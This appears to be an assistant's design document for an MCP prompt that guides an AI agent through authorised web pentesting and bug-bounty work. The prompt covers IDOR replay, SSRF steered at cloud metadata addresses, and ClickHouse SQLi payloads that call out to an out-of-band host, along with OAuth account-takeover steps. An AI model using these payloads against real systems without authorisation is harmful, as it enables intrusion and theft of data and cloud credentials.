# pentest_workflow Prompt — v3 (final, ready to wire)

> **Status**: final draft, ready for `tools.py`. Successor to `prompt_v1.md` and
> `prompt_v2.md`.
>
> v3 applies all 12 edits from the v2 case-hardening review:
> - 4 must-fix (correctness + missing actionable plays)
> - 6 should-fix (density + pedagogy)
> - 2 polish (refactor + fluff cuts)

## What changed vs v2 (in priority order)

| # | Edit | Why |
|---|------|-----|
| 1 | **Fixed unauth-replay correctness bug** | v2 told the agent to "strip Cookie + Authorization headers" for the public-endpoint dis-confirmation step. This is **wrong**: `Playwright APIRequestContext.fetch` auto-injects cookies from the context's cookie jar regardless of the `headers` arg. The only correct unauth path is `session_create_context(name="anon", from_profile=False)`. |
| 2 | **Pre-engagement secrets-pack hint** | Shipped `defaults.yaml` only flags `AKIA*`. Volc / BytePlus / Douyin assets use `AKLT*` internal AKs, STS triples, kubeconfig blobs. Empty `traffic_findings(category=secret_leak)` doesn't mean clean — it means the regex pack isn't tuned. Added a one-line PHASE 0 note. |
| 3 | **OAuth ticket pattern is now actually executable** | v2 said "verify the SAME identity is bound through every step" but didn't name the tools. v3 chains `traffic_auth_detect → traffic_tag → traffic_chain → traffic_extract_session_variable → traffic_replay_via_browser` so the agent has a callable plan. |
| 4 | **Cross-tenant secret-reuse check** | A recurring class (BytePlus AK reused across users). Added a one-liner under IDOR's cross-tenant variant: `traffic_findings(category="secret_leak")` then look for the same evidence string across different `profile_label`s. |
| 5 | **ClickHouse / TLS-SQL custom payload directive** | Bundled sqli list won't trigger `url()` table-function or extractvalue chains. v3 tells the agent to edit `defaults.yaml` for ClickHouse-specific payloads. |
| 6 | **Tool Blind-Spots moved + shrunk** | Was at position 2 reading like a lecture. Now placed *after* PHASE 1's STOP CRITERION — just-in-time advice when the agent is staring at thin findings. Cut from 7 bullets to 4. |
| 7 | **POST coverage cue in PHASE 1** | "Browse organically" wasn't enough — case logs explicitly show that real victims hide on POSTs that no scanner ever fuzzed. v3 says "deliberately drive every CRUD button". |
| 8 | **New high-yield surface category** | Added `Log / dashboard / job-status pages` (Spark UI / Hive UI / /history). Dropped on the floor 4 EMR / Flink / ML-platform / BioOS STS-leak cases otherwise. |
| 9 | **`profile_label` named once** | The DB column that proves "my replay actually went out as victim". v2 never mentioned it — agent had no way to verify identity propagation. |
| 10 | **`traffic_findings(kind="signal")` fallback in WHEN STUCK** | Half the SaaS SSRF reports rode on signals not findings. |
| 11 | **Tag→Vuln table promoted to top-level reference** | Was inside PHASE 2; PHASE 3 sub-patterns now reference rows by tag without duplicating. |
| 12 | **Fluff cuts** | Dropped CORE MENTAL MODEL §3 ("three identity questions") and §4 ("close the loop") — already covered in phases. Folded sessionStorage warning into WHEN STUCK. ~12 lines saved; v3 ends ~v1 length with all v2 value retained. |

## Length budget

~150 lines markdown body, ~3.7 KB output. Same length envelope as v2 despite
adding 4 new actionable plays — the fluff cuts paid for the additions.

## Insertion point

```
src/agent_proxy/tools/tools.py
  @mcp.prompt()
  async def pentest_workflow() -> str:
    ...
  # immediately above the existing triage_note prompt (line 933)
```

---

## Full prompt body (v3 — final)

```python
@mcp.prompt()
async def pentest_workflow() -> str:
    """End-to-end pentest / SRC playbook for AgentProxy. Call this at the
    start of any web pentesting / bounty session — it returns an action
    plan keyed to the current state of your session, plus a curated list
    of common traps to avoid.

    Designed to be called once per task; thereafter use the per-flow
    triage_note prompt as you finish each endpoint."""

    # ===== Live session snapshot =====
    status = session.get_status()
    running = status.get("session_active", False)
    contexts = status.get("contexts", [])
    active_ctx = status.get("active_context", "default")
    traffic_count = status.get("traffic_count", 0)
    findings_stats = session.mitm.db.findings_stats() if running else None
    notes_stats = session.mitm.db.notes_stats() if running else None

    if not running:
        stage_hint = "PHASE 0 — session not started; begin with session_start"
    elif traffic_count == 0:
        stage_hint = ("PHASE 0/1 — session up but no traffic captured yet; "
                      "drive the browser through the app to populate the DB")
    elif (notes_stats and notes_stats["total"] == 0
          and findings_stats and findings_stats["findings"]["count"] > 0):
        stage_hint = ("PHASE 2/3 — findings present, no notes yet; "
                      "start per-endpoint triage")
    elif notes_stats and notes_stats["total"] > 0:
        stage_hint = ("PHASE 3/4 — notes in progress; verify open leads, "
                      "record verdicts, build evidence_bundle when confirmed")
    else:
        stage_hint = "PHASE 1/2 — traffic captured; surface findings and triage"

    snapshot_lines = [f"- Session: {'running' if running else 'NOT running'}"]
    if running:
        snapshot_lines.append(
            f"- Browser contexts: {contexts} (active: `{active_ctx}`)")
        snapshot_lines.append(f"- Traffic flows captured: {traffic_count}")
        if findings_stats:
            f_count = findings_stats["findings"]["count"]
            s_count = findings_stats["signals"]["count"]
            f_sev = findings_stats["findings"].get("by_severity", {})
            snapshot_lines.append(
                f"- Findings: {f_count} (high={f_sev.get('high', 0)}, "
                f"medium={f_sev.get('medium', 0)}, low={f_sev.get('low', 0)}); "
                f"signals (low-confidence): {s_count}")
        if notes_stats:
            v = notes_stats.get("by_verdict", {})
            snapshot_lines.append(
                f"- Triage notes: {notes_stats['total']} "
                f"(vulnerable={v.get('vulnerable', 0)}, "
                f"not_vulnerable={v.get('not_vulnerable', 0)}, "
                f"inconclusive={v.get('inconclusive', 0)})")
    snapshot = "\n".join(snapshot_lines)

    return f"""You are doing AUTHORISED web pentesting / SRC bounty work with AgentProxy.
This prompt is your playbook. Read it once, then act.

═══ LIVE SESSION SNAPSHOT ═══
{snapshot}

→ Suggested next focus: **{stage_hint}**

═══ CORE MENTAL MODEL ═══

1. ~90% of bounty payouts come from BUSINESS-LOGIC bugs — IDOR, BOLA,
   privilege escalation, cross-tenant access, info disclosure, OAuth /
   ticket logic, multi-step SSRF. NOT from SQLi/XSS payload spray.
   Most authenticated bugs are missing OBJECT-OWNERSHIP checks (server
   knows you're logged in but never checks the resource is yours), not
   missing auth.

2. Spend cheap signals before expensive ones:
       findings_stats / site_map  →  traffic_findings  →
       traffic_params(flow_id)  →  traffic_inspect(level=meta)  →
       traffic_inspect(level=full)   ← LAST resort
   Reading a 50KB JSON body costs ~10× more agent context than its
   parameter map. Don't read what you can grep.

═══ PARAM-TAG → VULN CLASS REFERENCE ═══

`traffic_params` annotates every mutable parameter with semantic tags
loaded from defaults.yaml. The tag IS the attack hint:

  | tag                                 | likely vuln class                |
  |-------------------------------------|----------------------------------|
  | identity_param / object_id_param    | IDOR / BOLA / cross-tenant       |
  | privilege_param                     | vertical privilege escalation    |
  | ssrf_candidate / object_storage     | SSRF / SSRF-via-storage          |
  | redirect_candidate                  | open redirect / OAuth abuse      |
  | sql_candidate                       | SQLi / order-by / ClickHouse url()|
  | expression_candidate                | SSTI / SpEL / Groovy sandbox bypass|
  | command_candidate                   | command injection / RCE          |
  | state_token                         | CSRF / auth bypass / OAuth state |
  | money_param                         | price tampering / negative amount|
  | file_param                          | LFI / path traversal / upload    |

═══ PHASE-BY-PHASE PLAYBOOK ═══

▶ PHASE 0 — SESSION SETUP (one-time per target)

   PRE-ENGAGEMENT: shipped passive secret-leak rules only flag `AKIA*`.
   Before starting, edit defaults.yaml and add target-specific patterns
   (e.g. `AKLT[0-9A-Za-z]{{16,}}` for Volc / BytePlus internal AKs, STS
   triples, kubeconfig). Run `config_show(section="passive_scan")` to
   verify they loaded.

   session_start(profile_dir="/tmp/agentproxy/<target>")
   browser_navigate(url="<login_page>")
   # user logs in manually OR drive with browser_fill / browser_click
   session_save_profile(name="default")

   For dual-identity tests (RECOMMENDED on multi-tenant or role-based apps):
       session_create_context(name="victim", from_profile=False)
       session_use_context(name="victim")
       browser_navigate(url="<login_page>")  # log in as the OTHER user
       session_save_profile(name="victim")
       session_use_context(name="default")    # back to attacker

   Every captured flow carries `profile_label` = the context that produced
   it. Use it (in traffic_inspect, evidence_bundle, traffic_diff) to
   confirm a replay actually went out as the intended identity.

▶ PHASE 1 — ATTACK SURFACE MAP

   Browse 5–10 minutes ORGANICALLY, then deliberately drive every CRUD
   button — many real victims hide on POSTs that no scanner ever fuzzed.
   Cover these high-yield surfaces (LLMs miss most of these unless told):

   ◆ Multi-tenant boundaries — anywhere URL/body has tenantId, orgId,
     projectId, clusterId, workspaceId, environmentId
   ◆ Workflow / automation — user input becomes config the server LATER
     EXECUTES (datasource URL, webhook, restapi step, scheduled task,
     function source, sandbox eval)
   ◆ Files — upload (avatar, attachment, KYC), import (Excel/CSV/XML/
     Zip), export, preview (PDF / Office), download
   ◆ Account & auth — registration, login, password reset, MFA,
     OAuth bind/unbind, 第三方登录 callback, mobile/email change
   ◆ Sharing & invites — public-link generation, share-token endpoints,
     team / org invitation
   ◆ Money paths — order create, coupon apply, refund, payout
   ◆ Log / dashboard / job-status pages — Spark UI, Hive UI, /history,
     /jobs, debug logs that print STS / AK / kubeconfig
   ◆ Admin / debug / older-version surfaces — /admin, /actuator,
     /api-docs, /swagger, /debug, /.git/, /.env, /api/v1 vs /v2 deltas,
     "internal" hostnames bleeding into production

   Then:
       traffic_findings_stats()
       site_map()
       traffic_findings(severity="high")

   STOP CRITERION: 5–10 endpoints worth investigating. Not exhaustive.

   ── Tool blind-spots — READ if findings list is thin ──
   Passive findings catch maybe 30% of real bugs. Routinely missed by
   ALL scanner types: (1) IDOR / BOLA / cross-tenant, (2) Multi-step
   SSRF (A stores → B fetches), (3) OAuth / ticket logic, (4) TOS/S3
   SDK following 302 → metadata. AgentProxy's edge IS exactly these —
   triage by hand, don't trust empty findings.

▶ PHASE 2 — PER-ENDPOINT TRIAGE

   For EACH high-priority endpoint:

       traffic_params(flow_id=<id>)    # ALWAYS this before inspect

   Look up the tags in the reference table above. Body inspection is
   LAST resort: stay at level="meta" until tags + findings tell you the
   body is the missing piece.

   Body-content guardrails: if `body_omitted="binary"` or
   `body_truncated=true`, do NOT regex-search; use `traffic_extract` with
   a structural selector or skip the body entirely.

▶ PHASE 3 — VERIFICATION (the part that finds bugs)

   ── IDOR / BOLA / cross-tenant — primary class, ~50% of bounty payouts ──
   Three-replay protocol (mandatory; one-replay-and-conclude is a trap):
     1. traffic_replay_via_browser(flow_id=X, context="victim")
        → succeeds with attacker's data? candidate.
     2. PUBLIC-ENDPOINT DIS-CONFIRMATION (essential — prevents FPs):
        session_create_context(name="anon", from_profile=False)
        traffic_replay_via_browser(flow_id=X, context="anon")
        → if this also succeeds, the endpoint is PUBLIC, not vulnerable.
        (Note: stripping headers via headers_json does NOT remove
         Playwright's auto-injected cookies — only an unauthed context
         does. Hence the fresh-context pattern.)
     3. Mirror: have victim's flow replayed via attacker context too;
        both directions confirming kills false positives.
   Then: traffic_diff and traffic_tag(new_flow_id, "bola_<resource>").

   Cross-tenant variant: mutate tenantId / orgId / projectId in the body
   to a foreign id; same three-replay protocol.
   Cross-tenant SECRET reuse: traffic_findings(category="secret_leak") —
   if the same evidence string appears in flows with different
   `profile_label` values, that's secret-reuse cross-tenant exposure
   (high severity, no replay needed).

   ── Stored-input-trigger SSRF (THE classic AI-platform / SaaS bug) ──
   Pattern: endpoint A accepts `url` / `webhook` / `datasource` / `import`
   and SAVES it; endpoint B (preview, run, refresh, fetch) triggers it.
   Steps:
     1. Locate B if you don't have it: traffic_search(query="<storage_endpoint>")
        or traffic_find_by_tag("preview") — A and B may live in different
        flows captured minutes apart.
     2. traffic_replay_via_browser(flow_id=A, body=<mutated with OOB url>)
     3. Trigger B in the browser, OR replay B if you know its flow_id.
     4. Wait for the OOB callback. If it lands → confirmed.
     5. traffic_link(A, B, relation="stored_input_trigger") so the chain
        is captured for evidence_bundle.

   ── Direct SSRF / open redirect ──
   For OOB you MUST have a collaborator domain. ASK THE USER for an
   interactsh / dnslog domain — never hallucinate one or use localhost
   blindly.
       traffic_replay_via_browser(flow_id=X, body=<param=https://<id>.dnslog.cn>)
   Inspect both response (full reflection?) and OOB hit log.
   TOS / S3 SDK metadata leak — high-yield variant: many SDKs follow 302
   by default. Set the param to `tos.attacker.com`, resolve attacker.com
   to `100.96.0.96` (Volc) / `169.254.169.254` (AWS) / `100.100.100.200`
   (Aliyun) / `metadata.tencentyun.com` (Tencent).

   ── SQLi / order-by / SSTI / cmd ──
       traffic_fuzz(flow_id=X, target_param=Y, payload_category="sqli")
   `reflected: true` is gold (often XSS/SSTI candidate too).
   5xx + `sqli_db_error` finding → high confidence.
   ClickHouse / TLS-SQL / OneService targets: shipped sqli payloads do
   NOT cover `url()` table-function or `extractvalue` chains. Edit
   defaults.yaml to add a target-specific category, e.g.:
       fuzz_payloads:
         sqli_clickhouse:
           - "select 1 from url('http://OOB','CSV','x String')"
           - "' AND extractvalue(1,concat(0x7e,(select currentUser()),0x7e))-- "
   Then traffic_fuzz(payload_category="sqli_clickhouse").

   ── Auth bypass / OAuth ticket / password-reset ──
   1. traffic_auth_detect() — surface every Bearer / JWT / state-token /
      CSRF / API key in the capture set.
   2. Tag the entry / callback / bind / verify steps explicitly:
      traffic_tag(flow_id, "oauth_callback") / "bind_step" / "ticket_mint".
   3. traffic_chain(flow_id=<bind step>, depth=3) to walk the chain.
   4. Verify the SAME identity is bound at every step. Mismatch =
      account-takeover candidate. For ticket-passthrough abuse:
        traffic_extract_session_variable(name="ticket",
            flow_id=<step that mints it>, regex_pattern=...)
        traffic_replay_via_browser(flow_id=<bind step>,
            body=<...$ticket...>)
      If the bind step accepts a ticket minted under attacker identity
      to bind the victim's resource → ATO confirmed.

   ── Sandbox / version bypass ──
   When you see Groovy / SpEL / Jinja / Velocity / Freemarker / sandboxed
   eval (tag = expression_candidate), fingerprint the version first
   (browser_get_html on script bundles, /actuator, error pages, JS hints
   like `window.__APP_VERSION__`). The passive scanner does NOT version-
   fingerprint — that's on you. Then look up known bypasses for that
   version and test via traffic_replay_via_browser.

   ── Mutation grammar (sparingly, paired with patterns above) ──
   * Param duplication: ?id=1&id=2 ; arrays: ?id[]=1&id[]=2
   * Header / method overrides: X-HTTP-Method-Override, _method=PUT
   * Hidden flags: ?debug=1, ?test=1, ?admin=1

   AFTER each replay (mandatory close-the-loop):
       traffic_diff(original_flow_id, new_flow_id)
       traffic_tag(new_flow_id, "<vuln-type>_<short-name>")
       traffic_link(original_flow_id, new_flow_id,
                    relation="identity_swap" or "payload_mutation"
                          or "stored_input_trigger" or "param_passthrough"
                          or "ticket_passthrough")

▶ PHASE 4 — RECORD VERDICT (mandatory, every endpoint)
   note_add(flow_id=X, verdict="...", scenario="...",
            sensitive_fields="...", test_steps="...", conclusion="...")
   "tested X / Y / Z, no anomaly" is the most useful note for the next
   session. Use the `triage_note` prompt for the 4-section template.

▶ PHASE 5 — REPORT (only when a vulnerability is confirmed)
   evidence_bundle(flow_id=<root_flow>, depth=3) — sweeps the link DAG;
   bundles requests / responses / notes / findings / curl reproducer
   into Markdown. Drop straight into the SRC submission.

═══ COMMON TRAPS — don't do these ═══

× DON'T conclude IDOR from one cross-replay. Run the THREE-REPLAY protocol
  (victim ctx, anon ctx, mirror). Many "IDOR-looking" endpoints are public.
× DON'T strip Cookie/Authorization in headers_json hoping for unauth
  replay — Playwright re-injects from the context cookie jar. Spawn a
  fresh `from_profile=False` context instead.
× DON'T hallucinate OOB domains or use localhost. Ask the user for an
  interactsh / dnslog domain when SSRF/RCE/XXE testing needs callbacks.
× DON'T regex-search response bodies marked `body_omitted="binary"` or
  `body_truncated=true`. Use traffic_extract or skip.
× DON'T `traffic_list(limit=200)` on first contact. Use site_map.
× DON'T inspect every flow with level="full". Default to "meta".
× DON'T inspect a flow's body before running traffic_params on it.
× DON'T use `traffic_replay` (curl_cffi) when a browser context is alive.
  Dynamic CSRF / signed headers / refreshed JWT will 401 you.
  Use `traffic_replay_via_browser`.
× DON'T fuzz blindly. Random payload spray on identity_params won't find
  IDOR. Match the payload class to the tag (reference table above).
× DON'T forget note_add on `not_vulnerable` — most valuable long-term
  artifact. "Tested X, Y, Z, no anomaly" prevents next-session redo.
× DON'T enable `unsafe_disable_web_security` unless you specifically need
  to bypass SOP — it invalidates real CORS findings.
× DON'T re-investigate a flow without `note_get(flow_id=X)` first.
× DON'T trust empty `traffic_findings(severity=high)` as a clean bill of
  health. IDOR / multi-step SSRF / OAuth flow / sandbox bypass are
  routinely UNDETECTED by passive rules.
× DON'T forget to switch back to `default` context after a victim test.
  Check `session_status()` before continuing recon.

═══ WHEN STUCK ═══

Empty high-severity findings → run `traffic_findings(kind="signal")`
once. SSRF / sensitive-param signals don't reach finding tier but cued
half the recent SaaS SSRF reports.

Empty findings AND empty signals → not exercising deep enough. Hit the
PHASE 1 high-yield surfaces explicitly; drive POSTs deliberately.

Replays keep 401-ing → confirm session_use_context; reload saved profile;
check `browser_get_console_logs()` for frontend errors. If the app stores
Bearer tokens in `sessionStorage`, Playwright's storage_state will NOT
capture it — use `browser_execute_js` to read/write the token, or ask
the user to re-login after restart.

50/50 verdict → `note_add(verdict="inconclusive", ...)` with the missing
piece named (other account? OOB? other payload class? newer version?).
Don't burn cycles.

`config_show()` reveals current semantic tags / fuzz categories / passive
rules. Edit defaults.yaml between sessions to add target-specific intel
(new param names you see this engagement, vendor-specific secrets, etc.).

═══ BEGIN. ═══
"""
```

---

## v3 verification matrix (against the 9 case-file walkthroughs from the v2 review)

| Case | v2 verdict | v3 verdict |
|------|------------|------------|
| historyId IDOR | Pass with fix (unauth bug) | **Pass** — three-replay protocol now correct |
| 营销平台 multi-step SSRF | Pass | **Pass** + tighter (search-for-B step) |
| 飞书 OAuth ATO | Partial fail (no callable plan) | **Pass** — auth_detect → tag → chain → extract → replay |
| Groovy 0day sandbox | Acceptable miss | **Acceptable miss** (out of scope for any prompt) |
| TOS-302 metadata | Pass — best block | **Pass** (unchanged + cleaner) |
| ClickHouse `url()` SQLi | Partial fail (no actionable fix) | **Pass** — defaults.yaml edit example shown |
| AKLT* / log-leak | Fail (regex pack gap) | **Pass** — pre-engagement note |
| Cross-tenant secret reuse | Partial fail | **Pass** — finding-by-profile_label one-liner |
| POST-not-scanned | Fail | **Pass** — explicit "drive every CRUD button" |

## Open question for the user before wiring in

The v3 prompt is ready. To wire it in, I'll:

1. Add `pentest_workflow` as a second `@mcp.prompt()` in
   `src/agent_proxy/tools/tools.py` (right above `triage_note`).
2. Update FastMCP `instructions=` in `main.py` so MCP clients see a hint
   like *"call the `pentest_workflow` prompt to get the full playbook"*.
3. Update README and docs/prd.md to mention the prompt.
4. Test that prompt registration works (existing tests still pass).

Should I proceed, or do you want one more review pass on v3?
